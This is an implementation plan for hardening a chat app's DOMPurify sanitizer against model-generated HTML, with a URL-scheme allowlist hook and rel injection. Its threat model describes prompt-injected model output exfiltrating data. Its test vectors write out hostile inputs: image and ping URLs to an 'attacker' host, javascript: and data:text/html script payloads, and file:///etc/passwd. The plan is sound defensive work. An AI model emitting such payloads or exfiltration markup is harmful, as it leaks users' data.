# Implementation Plan: Security — Sanitizer Hardening (URL allowlist + anchor `rel`)

## 1) Goal

Tighten the DOMPurify configuration in `mathmate-v2/src/lib/sanitize.ts` so that:

- Model-injected HTML cannot exfiltrate data via `<a href>`, `<img src>`, or SVG `href`/`xlink:href` pointing to dangerous schemes (`javascript:`, `data:text/html`, `file:`, `vbscript:`, `data:application/...`).
- Every anchor that gets `target="_blank"` automatically also gets `rel="noopener noreferrer"` to prevent tab-nabbing and reverse-tabnab.
- Additional attack-surface attributes (`formaction`, `ping`, `autofocus`) are forbidden.

This plan covers roadmap items **(6)** and **(9)**.

---

## 2) Threat Model (Practical)

- Adversary: prompt-injected model output that passes DOMPurify's tag/attribute allowlist.
- Capability sought:
  - Data exfiltration via `<img src="https://attacker/?exfil=DOMSTRING">` or `<a href="..." ping="https://attacker/ping">`.
  - Code execution via `javascript:` or `data:text/html` URLs.
  - Phishing via reverse-tabnab on `target="_blank"` without `rel="noopener"`.
- Mitigation: a `DOMPurify.addHook('afterSanitizeAttributes', ...)` callback that:
  - Validates `href`/`src`/`xlink:href` against an explicit scheme allowlist.
  - Strips or rewrites disallowed schemes.
  - Auto-injects `rel="noopener noreferrer"` on anchors with `target="_blank"`.
- Out of scope: model-side jailbreaks (separate concern; we assume the model is partially adversarial).

---

## 3) Scope

### In scope
- New `addHook` call in `sanitize.ts` enforcing URL scheme allowlist and `rel` injection.
- Forbid `formaction`, `ping`, `autofocus` via `FORBID_ATTR`.
- New unit tests in `sanitize.test.ts` (Vitest) covering the malicious payload classes.
- Visual regression check: KaTeX still renders identically.

### Out of scope
- Replacing DOMPurify itself.
- Adding a server-side sanitizer (we have no server).
- Stripping all `data:` URLs (image attachments use `data:image/...;base64,...` legitimately — these are allowlisted).

---

## 4) System Design

### 4.1 URL scheme allowlist

Schemes allowed in `href` / `src` / `xlink:href`:
- `http:` / `https:` (anchors)
- `data:` (only for `<img>` with `image/*` mime)
- `mailto:` (anchors)
- Relative URLs (no scheme) — allowed
- `asset:` (Tauri asset protocol, for `load_image` outputs)
- Fragment-only (`#anchor`) — allowed

Schemes rejected (URL stripped, element remains if not a critical attribute):

This intentionally aligns with CSP (`img-src 'self' data: asset:`): remote image URLs are blocked at sanitize-time and policy-time.
- `javascript:`
- `vbscript:`
- `data:` (when used on anchor `href` OR when mime is not `image/`)
- `file:`
- `blob:`
- Anything else not in the allowlist

### 4.2 `rel` injection

Anchor rewrite rule:
- If `target` is set (any value, including `_blank`), set `rel` to `noopener noreferrer`.
- If `rel` was already present, **append** (don't clobber user-specified values), but ensure both `noopener` and `noreferrer` are present.

### 4.3 Strip disallowed attrs

Remove these entirely:
- `formaction` (already in DOMPurify defaults for forms, but make explicit)
- `ping` (anchor reverse-ping)
- `autofocus` (UX attack vector — a model could auto-focus a hidden form field)

### 4.4 Implementation shape

```ts
// In sanitize.ts
import DOMPurify from "dompurify";

const ALLOWED_HREF_SCHEMES = ["http:", "https:", "mailto:"];
const ALLOWED_SRC_SCHEMES  = ["data:", "asset:"];
const DATA_IMAGE_MIME = /^data:image\/(png|jpe?g|gif|webp|svg\+xml);/i;

function safeUrl(raw: string, kind: "href" | "src"): string | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  // Allow relative URLs and fragments
  if (trimmed.startsWith("#") || trimmed.startsWith("/") || !trimmed.includes(":")) return raw;
  let url: URL;
  try { url = new URL(trimmed); } catch { return null; } // not a URL → drop
  const proto = url.protocol.toLowerCase();
  if (kind === "href") {
    if (ALLOWED_HREF_SCHEMES.includes(proto)) return raw;
    if (proto === "data:") return null;            // anchors never get data:
    return null;
  } else { // src
    if (ALLOWED_SRC_SCHEMES.includes(proto)) {
      if (proto === "data:" && !DATA_IMAGE_MIME.test(raw)) return null;
      return raw;
    }
    return null;
  }
}

DOMPurify.addHook("afterSanitizeAttributes", (node) => {
  // Strip / rewrite href, src, xlink:href
  for (const attr of ["href", "src", "xlink:href"] as const) {
    if (!node.hasAttribute(attr)) continue;
    const kind = attr === "href" ? "href" : "src";
    const safe = safeUrl(node.getAttribute(attr)!, kind);
    if (safe === null) node.removeAttribute(attr);
    else node.setAttribute(attr, safe);
  }
  // Anchor rel injection
  if (node.tagName === "A" && node.hasAttribute("target")) {
    const existing = (node.getAttribute("rel") || "").toLowerCase().split(/\s+/).filter(Boolean);
    const need = ["noopener", "noreferrer"].filter((t) => !existing.includes(t));
    const merged = [...existing, ...need].join(" ");
    node.setAttribute("rel", merged);
  }
});
```

### 4.5 Order of operations

The `afterSanitizeAttributes` hook fires after DOMPurify has already filtered tags/attrs. By the time it runs, the allowlisted tags are guaranteed; we just need to validate URL-shaped attribute values. This is the right hook (not `uponSanitizeElement`).

---

## 5) File-by-File Tickets

### S6E1 — `safeUrl` helper + hook
**Modify:**
- `mathmate-v2/src/lib/sanitize.ts`

**Tasks:**
- Add the `ALLOWED_HREF_SCHEMES` and `ALLOWED_SRC_SCHEMES` constants and `safeUrl` function.
- Register the `afterSanitizeAttributes` hook at module load.
- Add `formaction`, `ping`, `autofocus` to `FORBID_ATTR`.
- Keep all existing `ALLOWED_TAGS` and `ALLOWED_ATTR` lists intact (KaTeX compatibility).

### S6E2 — Unit tests
**New:**
- `mathmate-v2/src/lib/sanitize.test.ts`

**Tasks:**
- Test vectors:
  - `<a href="https://example.com/" target="_blank">` → `rel="noopener noreferrer"`
  - `<a href="https://example.com/" target="_blank" rel="author">` → `rel="author noopener noreferrer"` (preserves existing tokens)
  - `<a href="javascript:alert(1)">` → `href` removed, anchor still present
  - `<a href="data:text/html,<script>alert(1)</script>">` → `href` removed
  - `<img src="https://attacker/?d=x">` → `src` removed
  - `<img src="data:image/png;base64,AAAA">` → kept
  - `<img src="data:text/html,<script>alert(1)</script>">` → `src` removed
  - `<img src="file:///etc/passwd">` → `src` removed
  - `<svg><use xlink:href="javascript:alert(1)"/></svg>` → `xlink:href` removed
  - `<a ping="https://attacker/ping">` → `ping` removed
  - `<input autofocus>` → `autofocus` removed
  - KaTeX rendering: `<span class="katex">...<svg><path d="..."/></svg>...</span>` still passes through unchanged.

### S6E3 — Streaming-payload check
**Modify:**
- `mathmate-v2/src/components/ChatPage.tsx` (the streaming render path at line 469)

**Tasks:**
- Confirm `sanitize(renderMarkdown(streamingContent))` is the only path used.
- Add a regression test: feed `'<a href="javascript:alert(1)" target="_blank">x</a>'` through `renderMarkdown` then `sanitize` and assert `href` is absent and `rel` is present.

### S6E4 — Docs
**Modify:**
- `docs/mathmate/SECURITY.md` (new file from `Implementation_Security_ContentSecurityPolicy.md`) — add a "Sanitizer Hardening" section explaining the URL allowlist.

---

## 6) Testing Plan

### Unit
- Full coverage in `sanitize.test.ts` per §5/S6E2.
- Existing snapshot/render tests for `renderMarkdown.ts` still pass (KaTeX output unchanged).

### Manual
- In a chat, simulate a model response that includes a malicious link by pasting a raw markdown block with `<a href="javascript:alert(1)">click</a>` into the message composer (or use DevTools to inject into a streamed message). Confirm the link has no `href` and is rendered as plain text or a non-clickable span.
- Verify that legitimate model links (e.g., to openrouter.ai or arxiv.org) still work and open in a new tab.
- Verify remote images in model HTML are blocked (no clickable/image exfil path).
- Verify image attachments (base64 data URLs) still render in the chat.

### CI
- `npm run build` and `vitest` (if configured) both pass.

---

## 7) Acceptance Criteria

- [ ] `sanitize.ts` registers an `afterSanitizeAttributes` hook that strips disallowed URL schemes.
- [ ] All anchors with `target` automatically get `rel="noopener noreferrer"`.
- [ ] `formaction`, `ping`, `autofocus` are in `FORBID_ATTR`.
- [ ] KaTeX rendering unchanged.
- [ ] All `sanitize.test.ts` vectors pass.
- [ ] CHANGELOG and dev log updated.

---

## 8) Rollout Plan

1. Land the hook + helper with tests.
2. Enable by default with no user-facing bypass toggle for weakened sanitizer policy.
3. CHANGELOG entry: "Changed (Security): DOMPurify now strips `javascript:`, `data:text/...`, `file:`, and remote image URLs from model-rendered HTML; anchors with `target` automatically receive `rel='noopener noreferrer'`."
